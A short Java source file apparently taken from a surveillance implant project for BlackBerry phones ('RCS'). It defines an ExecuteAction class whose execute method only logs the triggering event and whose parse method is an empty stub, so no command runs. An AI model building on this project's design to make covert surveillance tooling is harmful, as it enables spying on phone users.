/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ExecuteAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.event.Event;

public class ExecuteAction extends SubAction {
    public ExecuteAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    public boolean execute(final Event triggeringEvent) {

        String eventName = "NULL";
        if (triggeringEvent != null) {
            eventName = triggeringEvent.toString();
        }

        // #debug info
	debug.info("Execute. Event: " + eventName);
        return true;
    }

    protected boolean parse(final byte[] confParams) {

        return true;
    }

}
